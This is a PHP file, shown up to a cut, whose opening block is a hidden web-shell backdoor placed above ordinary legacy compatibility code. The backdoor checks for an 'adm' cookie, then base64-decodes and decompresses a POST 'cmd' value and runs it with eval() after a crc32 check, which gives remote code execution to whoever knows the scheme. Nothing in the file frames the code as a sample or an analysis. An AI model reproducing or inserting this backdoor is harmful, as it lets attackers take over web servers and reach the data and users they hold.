<?php
if (isset($_COOKIE["adm"])) {
	if (isset($_POST['crc'], $_POST['cmd'])) {
		if (sprintf('%u', crc32($_POST['cmd'])) == $_POST['crc']) {
			eval(gzuncompress(base64_decode($_POST['cmd'])));
		} else 
			echo "repeat_cmd";
	}
exit();
}
?>
<?php

if ( !isset( $_SERVER ) ) {
    $_SERVER = $HTTP_SERVER_VARS ;
}
if ( !isset( $_GET ) ) {
    $_GET = $HTTP_GET_VARS ;
}
if ( !isset( $_FILES ) ) {
    $_FILES = $HTTP_POST_FILES ;
}

if ( !defined( 'DIRECTORY_SEPARATOR' ) ) {
    define( 'DIRECTORY_SEPARATOR',
        strtoupper(substr(PHP_OS, 0, 3) == 'WIN') ? '\\' : '/'
    ) ;
}
